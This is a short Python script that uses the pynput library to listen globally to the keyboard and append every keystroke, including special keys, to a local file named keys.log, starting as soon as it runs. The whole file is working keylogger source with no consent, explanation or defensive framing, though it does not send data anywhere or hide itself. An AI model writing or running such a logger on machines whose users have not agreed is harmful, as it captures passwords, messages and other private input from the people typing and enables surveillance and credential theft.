from pynput import keyboard

def on_press(key):
    try:
        with open("keys.log", "a") as f:
            f.write(key.char)
    except AttributeError:
        with open("keys.log", "a") as f:
            f.write(f"[{key}]")

def start_logger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

start_logger()



